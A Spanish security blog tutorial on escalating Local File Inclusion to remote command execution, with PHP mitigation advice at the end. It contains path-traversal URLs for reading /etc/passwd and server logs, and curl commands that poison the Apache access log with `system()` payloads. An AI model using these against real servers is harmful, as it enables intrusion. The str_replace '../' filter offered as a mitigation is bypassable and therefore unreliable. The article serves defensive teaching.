---
title: "LFI al Descubierto: De la Inclusión Local a la Ejecución Remota de Comandos (RCE)"
summary: "La vulnerabilidad de Local File Inclusion (LFI) no se limita únicamente a la inclusión de archivos locales. En manos de un atacante experimentado, esta falla puede convertirse en un vector de ataque crítico, capaz de escalar hasta la ejecución remota de comandos (RCE). Este artículo explora cómo los atacantes aprovechan esta vulnerabilidad para comprometer servidores y qué medidas puedes implementar para proteger tu aplicación y tu infraestructura. ¡Acompáñanos en este recorrido técnico y aprende a blindar tu sistema contra este tipo de amenazas!"
date: 2025-04-06
tags:
  - Seguridad Web
  - Path Traversal
  - Local File Inclusion
lang: es
---

# LFI al Descubierto: De la Inclusión Local a la Ejecución Remota de Comandos (RCE)

La vulnerabilidad de Local File Inclusion (LFI) no se limita únicamente a la inclusión de archivos locales. En manos de un atacante experimentado, esta falla puede convertirse en un vector de ataque crítico, capaz de escalar hasta la ejecución remota de comandos (RCE). Este artículo explora cómo los atacantes aprovechan esta vulnerabilidad para comprometer servidores y qué medidas puedes implementar para proteger tu aplicación y tu infraestructura. ¡Acompáñanos en este recorrido técnico y aprende a blindar tu sistema contra este tipo de amenazas!
<!-- more -->

## ¿Qué es Local File Inclusion (LFI)?

La vulnerabilidad de **Local File Inclusion (LFI)** se produce cuando un servidor web incluye archivos locales basándose en datos proporcionados por el usuario. Esta falla puede permitir la ejecución de código malicioso o la exposición de información sensible.

## Impacto de las LFI

Las vulnerabilidades LFI pueden generar serios problemas de seguridad en un servidor web, incluyendo:

-   **Acceso no autorizado a archivos sensibles**: Un atacante puede leer archivos de configuración y credenciales almacenadas en el sistema.
-   **Ejecución de código malicioso**: Si un atacante logra incluir archivos con contenido PHP, podría ejecutar código arbitrario en el servidor.
-   **Escalada de privilegios**: Un atacante podría combinar LFI con otras vulnerabilidades para obtener acceso privilegiado al sistema.
-   **Robo de información**: Exponer archivos con datos de usuarios o configuraciones del sistema puede comprometer la seguridad de la aplicación.
-   **Defacement y ataques persistentes**: Si un atacante logra modificar archivos del sistema, podría inyectar contenido malicioso en la página web o mantener acceso persistente al servidor.

### Ejemplo de LFI Básico

Este tipo de vulnerabilidades se aprovechan de una incorrecta sanitización de las entradas del usuario. Así, un atacante puede realizar modificaciones que alteren el funcionamiento de la aplicación web.

Imaginemos una aplicación web desarrollada en _PHP_:

<figure markdown="span">
    ![LFI básico](../../assets/posts/2025/04/06/LFIWP.png)
    <figcaption>Aplicación Web.</figcaption>
</figure>

Tenemos una barra de búsqueda donde podemos buscar cualquier archivo. La aplicación web estaría usando un código similar a este:
```php
<?php 
  $file = $_GET['file'];
  if (isset($file)){
    include($file);
  }
?>
```

Este código espera un parámetro `file` que contendrá el archivo que le pasemos al formulario de búsqueda. Si en el formulario ponemos un archivo como `hi.php`, la variable contendrá dicha cadena, haciendo referencia al fichero `hi.php` en el mismo directorio que el archivo de la aplicación web.

Si realizamos la búsqueda, la URL de nuestra web cambiará a:
```url
http://dominio.com/pruebas/index.php?archivo=hi.php
```

<figure markdown="span">
    ![Resultado de aplicar LFI básico](../../assets/posts/2025/04/06/BasicLFI.png)
    <figcaption>Resultado de aplicar LFI básico.</figcaption>
</figure>

Intentemos acceder al archivo que contiene la configuración de los usuarios en sistemas Linux, el fichero `/etc/passwd`. Como la entrada del parámetro `file` no está sanitizada, un atacante podría escribir lo siguiente en la URL de la aplicación web:
```url
http://dominio.com/pruebas/index.php?archivo=/etc/passwd
```

<figure markdown="span">
    ![Accesso al fichero /etc/passwd](../../assets/posts/2025/04/06/BasicLFI2.png)
    <figcaption>Acceso al fichero /etc/passwd.</figcaption>
</figure>

Esto supone un grave error de seguridad, ya que el atacante podría obtener información privilegiada sobre los usuarios del sistema o acceder a otros recursos como:

**Archivos de configuración y credenciales**:

*   `/etc/passwd` → Lista de usuarios del sistema (Linux).
*   `/etc/shadow` → Contraseñas encriptadas (requiere privilegios).
*   `/etc/hosts` → Configuración de nombres de dominio locales.
*   `/etc/mysql/my.cnf` → Configuración de MySQL (puede contener credenciales).

**Archivos de logs (pueden contener información sensible o shell injection)**:

*   `/var/log/apache2/access.log` o `error.log` → Logs de Apache.
*   `/var/log/nginx/access.log` → Logs de Nginx.
*   `/var/log/auth.log` o `/var/log/secure` → Registros de autenticación.

Para prevenir esto, podríamos realizar una sanitización de la entrada que recibe el parámetro `file`:
```php
<?php 
  $file = $_GET['file'];
  if (isset($file)){
    include("/var/www/html" . $file);
  }
?>
```

<figure markdown="span">
    ![Acceso al fichero /etc/passwd restringido](../../assets/posts/2025/04/06/BasicLFIFix.png)
    <figcaption>Acceso al fichero /etc/passwd restringido.</figcaption>
</figure>

Con este cambio, el acceso a los ficheros que no están contenidos en la ruta `/var/www/html` está restringido, aumentando la seguridad en nuestro servidor.

### LFI con Path Traversal

Ahora, consideremos una aplicación web más robusta, donde el **LFI básico** no funciona, ya que la web contiene este código:
```php
<?php
  $file = $_GET['file'];
  if (isset($file)){
    include("/var/www/html". $file);
  }
?>
```

Esta protección impide acceder a cualquier archivo fuera del directorio especificado. Sin embargo, esta restricción puede ser eludida mediante **Path Traversal**.

El **Path Traversal**, también conocido como **Directory Traversal**, es una técnica para acceder a archivos y directorios fuera del directorio permitido por la aplicación web. Se logra utilizando secuencias como `../` para subir niveles en el sistema de archivos.

Si una aplicación tiene un filtro que solo restringe archivos en su directorio de trabajo, se puede usar Path Traversal junto con LFI para acceder a archivos del sistema. Por ejemplo:
```url
https://dominio.com/pruebas/index.php?file=../../../../../../../../../../../etc/passwd
```

<figure markdown="span">
    ![Acceso al fichero /etc/passwd del servidor](../../assets/posts/2025/04/06/PTLFI.png)
    <figcaption>Acceso al archivo /etc/passwd del servidor.</figcaption>
</figure>

Este tipo de ataque es muy peligroso cuando se combina con LFI, ya que puede permitir a un atacante acceder a archivos críticos del sistema, incluyendo configuraciones, credenciales y registros de actividad del servidor. Además, es común escalar estos ataques a una ejecución remota de comandos, ya sea realizando un ataque de `LogPoisoning` o incluyendo una `Web Shell` en el servidor.

A continuación, veremos cómo escalar de una **Local File Inclusion** a una **Ejecución Remota de Comandos**.

### De LFI a RCE (Remote Code Execution)

La transición de una vulnerabilidad de **Local File Inclusion (LFI)** a **Remote Code Execution (RCE)** es una técnica avanzada que los atacantes pueden emplear para comprometer un sistema por completo. Estos son los métodos más comunes para lograr esta escalada:

#### Inclusión de archivos de registro con inyección de código

Si el servidor web registra las solicitudes en archivos de log accesibles, un atacante puede inyectar código malicioso en dichos registros y luego incluirlos mediante LFI. Por ejemplo:

1.  El atacante envía una solicitud maliciosa que inyecta código PHP en los logs del servidor:
```bash
curl -A "<?php system('whoami'); ?>" http://dominio.com
```
Aquí, el código PHP se inyecta en el archivo de logs del servidor web (por ejemplo, `/var/log/apache2/access.log`).

2.  Luego, utiliza LFI para incluir el archivo de log:
```url
http://dominio.com/pruebas/index.php?file=../../../../../../var/log/apache2/access.log
```

Esto ejecutará el código PHP inyectado, permitiendo al atacante ejecutar comandos en el servidor.

<figure markdown="span">
    ![Fichero logs de Apache](../../assets/posts/2025/04/06/ApacheLog.png)
    <figcaption>Acceso a los logs de acceso de Apache via LFI.</figcaption>
</figure>

Como se puede observar al final del log, se refleja que hemos accedido al directorio especificado. Esto significa que el contenido de la variable proporcionada en la URL ha sido procesado por el servidor, permitiendo al atacante visualizar información sensible o ejecutar código malicioso si el archivo incluido contiene instrucciones ejecutables.

Ahora, el atacante podría inyectar un malware que permita ejecutar comandos remotamente, es decir, mediante el archivo `access.log` de apache podría improvisar una shell.

## Inclusión de archivos cargados por el atacante (LFI + log poisoning)

En aplicaciones vulnerables a **LFI (Local File Inclusion)**, si además los logs del servidor (como el `access.log`) pueden ser manipulados, un atacante puede **inyectar código PHP en estos logs** y luego incluir esos archivos para ejecutar comandos arbitrarios.

### Inyección mediante el `User-Agent`

1.  El atacante envía una petición HTTP modificando el **User-Agent** para insertar código PHP en el archivo de logs (`access.log`):
```bash
curl -A "<?php system('id'); ?>" http://dominio.com/index.php
```
Esto genera una línea en el log que contiene:
```php
<?php system('id'); ?>
```

2.  Luego, el atacante usa la vulnerabilidad **LFI** para incluir el archivo de log. Por ejemplo:
```bash
curl "http://dominio.com/index.php?file=../../../../var/log/apache2/access.log"
```

Si el servidor incluye el log, **ejecutará el código PHP malicioso** que fue inyectado en el paso anterior.

<figure markdown="span">
    ![Ejecución del comando id](../../assets/posts/2025/04/06/LogPoisoning.png)
    <figcaption>RCE via LogPoisoning.</figcaption>
</figure>

### ¿Qué ocurre exactamente?

*   PHP usa `include()` para interpretar el archivo especificado.
*   Al incluir el log, se encuentra con una línea que contiene `<?php system('id'); ?>`.
*   PHP ejecuta esa línea como si fuera parte del código original.
*   El resultado del comando `id` se muestra en la respuesta HTTP.

## Inclusión de sesiones PHP

Si el servidor utiliza sesiones PHP y almacena los datos de sesión en archivos accesibles, un atacante puede manipular su sesión para inyectar código PHP:

1.  El atacante inicia una sesión y modifica su contenido:
```php
<?php
  session_start();
  $_SESSION['malicioso'] = "<?php system('id'); ?>";
?>
```

2.  Luego, utiliza LFI para incluir el archivo de sesión:
```url
http://dominio.com/pruebas/index.php?file=/path/to/sessions/sess_<session_id>
```

Esto ejecutará el código PHP inyectado en la sesión.

#### Inclusión de archivos temporales

En algunos casos, los archivos temporales generados por la aplicación pueden ser manipulados para incluir código malicioso. Por ejemplo, si la aplicación guarda datos de usuario en archivos temporales, un atacante podría inyectar código PHP en dichos datos y luego incluirlos mediante LFI.

### Mitigaciones para prevenir LFI a RCE

Para evitar que una vulnerabilidad de LFI escale a RCE, se deben implementar las siguientes medidas:

1.  **Validación estricta de entradas**:

    Utilizar listas blancas para limitar los archivos que pueden ser incluidos, además de rechazar caracteres como `../`, y otros que permitan Path Traversal.

    * **Listas Blancas (Whitelisting):**

        *   **Concepto:** Permite solo un conjunto específico de archivos o rutas que son consideradas seguras.
        *   **Ejemplo:** Si tu aplicación necesita incluir solo archivos `.php` desde un directorio específico, define una lista blanca que solo permita esos archivos.

            ```php
            <?php
            $allowed_files = [
                'home.php',
                'about.php',
                'contact.php'
            ];

            $file = $_GET['file'];

            if (in_array($file, $allowed_files)) {
                include('/var/www/html/pages/' . $file);
            } else {
                echo "Archivo no permitido.";
            }
            ?>
            ```

            En este ejemplo, solo los archivos `home.php`, `about.php` y `contact.php` pueden ser incluidos. Cualquier otro archivo será rechazado.

        *   **Rechazar Caracteres Peligrosos:**

            *   **Concepto:** Bloquea caracteres y secuencias que facilitan el Path Traversal y otras manipulaciones.
            *   **Ejemplo:** Eliminar o rechazar secuencias como `../`, `..\\`, y otros caracteres especiales.

            ```php
            <?php
            $file = $_GET['file'];

            // Eliminar Path Traversal
            $file = str_replace(['../', '..\\'], '', $file);

            if (file_exists('/var/www/html/pages/' . $file . '.php')) {
                include('/var/www/html/pages/' . $file . '.php');
            } else {
                echo "Archivo no encontrado.";
            }
            ?>
            ```

            Aquí, se eliminan las secuencias `../` y `..\` para evitar el Path Traversal para prevenir la terminación prematura de la ruta.

2.  **Deshabilitar funciones peligrosas**:

    Configurar `allow_url_include=Off` y `allow_url_fopen=Off` en `php.ini` y deshabilitar funciones como `system()`, `exec()`, `shell_exec()`, y similares.

    *   **`allow_url_include` y `allow_url_fopen`:**

        *   **Concepto:** Estas directivas permiten incluir archivos desde URLs remotas. Deshabilitarlas previene la inclusión de código desde fuentes externas, reduciendo el riesgo de RCE.
        *   **Configuración:** En el archivo `php.ini`, asegúrate de que estén configuradas como `Off`:

            ```php
            allow_url_include = Off
            allow_url_fopen = Off
            ```

        *   **Deshabilitar Funciones Críticas:**

            *   **Concepto:** Funciones como `system()`, `exec()`, `shell_exec()`, `passthru()` y `popen()` permiten la ejecución de comandos del sistema. Deshabilitarlas o restringir su uso impide que los atacantes ejecuten código arbitrario.
            *   **Configuración:** En el archivo `php.ini`, utiliza la directiva `disable_functions`:

            ```php
            disable_functions = system,exec,shell_exec,passthru,popen,proc_open,curl_exec,curl_multi_exec,parse_ini_file,show_source
            ```

            Esto deshabilita las funciones listadas, impidiendo su uso en el código PHP.

3.  **Aislar archivos sensibles**:

    Almacenar archivos de configuración, logs y sesiones fuera del directorio accesible por la aplicación web.

    *   **Concepto:** Almacena archivos de configuración, logs y sesiones fuera del directorio raíz accesible por la web.
    *   **Ejemplo:**

        *   **Logs:** Guarda los archivos de log en un directorio como `/var/log/app/` que no sea accesible directamente a través de la web.
        *   **Configuración:** Almacena los archivos de configuración en un directorio como `/etc/app/` y asegúrate de que el usuario del servidor web no tenga permisos de lectura.
        *   **Sesiones:** Configura PHP para guardar las sesiones en un directorio seguro fuera del alcance del servidor web, como `/var/lib/php/sessions/`.

        En el archivo `php.ini`:

        ```php
        session.save_path = "/var/lib/php/sessions"
        ```

        Asegúrate de que solo el usuario del sistema tenga acceso a este directorio.

4.  **Configurar permisos adecuados**:

    Restringir los permisos de lectura y escritura en archivos y directorios críticos.

    *   **Concepto:** Restringe los permisos de lectura y escritura en archivos y directorios críticos.
    *   **Ejemplo:**

        *   Utiliza `chmod` para configurar los permisos de los archivos. Por ejemplo, para un archivo de configuración:

            ```bash
            chmod 600 /etc/app/config.ini
            chown root:root /etc/app/config.ini
            ```

            Esto da permisos de lectura y escritura solo al usuario root.
        *   **Directorios:**

            ```bash
            chmod 700 /var/log/app/
            chown www-data:www-data /var/log/app/
            ```

            Esto da permisos de lectura, escritura y ejecución al usuario `www-data`, que es el usuario del servidor web, y restringe el acceso a otros usuarios.

5.  **Monitorear y auditar**:

    Revisar regularmente los logs del servidor para detectar actividades sospechosas e implementar herramientas de detección de intrusos (IDS) para identificar intentos de explotación.

    *   **Revisar Logs del Servidor:**

        *   **Concepto:** Analiza regularmente los logs del servidor web y de la aplicación para detectar patrones sospechosos, errores inusuales o intentos de acceso a archivos no autorizados.
        *   **Ejemplo:** Busca en los logs patrones como:

            *   Intentos de acceder a archivos sensibles (`/etc/passwd`, archivos de configuración).
            *   Errores de inclusión de archivos.
            *   Solicitudes con caracteres sospechosos (`../`).
    *   **Implementar IDS/IPS:**

        *   **Concepto:** Utiliza sistemas de detección de intrusos (IDS) y sistemas de prevención de intrusos (IPS) para identificar y bloquear intentos de explotación en tiempo real.
        *   **Ejemplo:** Configura reglas en el IDS/IPS para detectar patrones de Path Traversal, inyección de código y otros comportamientos maliciosos.

        Herramientas como [Snort](https://www.snort.org/){:target="_blank"} o [Suricata](https://suricata.io/){:target="_blank"} pueden ser configuradas para monitorear el tráfico de red y alertar sobre actividades sospechosas.

Stay safe. Stay smart. Stay secure.

---